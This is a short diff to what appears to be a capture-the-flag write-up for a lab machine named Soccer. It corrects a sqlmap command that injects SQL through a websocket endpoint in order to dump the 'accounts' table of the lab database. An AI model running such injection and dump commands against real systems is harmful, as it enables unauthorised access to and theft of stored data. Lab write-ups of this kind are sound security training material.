@@ -556,7 +556,7 @@ Seems there is only one table `accounts`. So this time I replace `--tables` with
 >
 
 ```bash
-$ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 -D soccer_db -T --dump --threads 10
+$ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 -D soccer_db -T accounts --dump --threads 10
 
 ...[snip]...
 Database: soccer_db
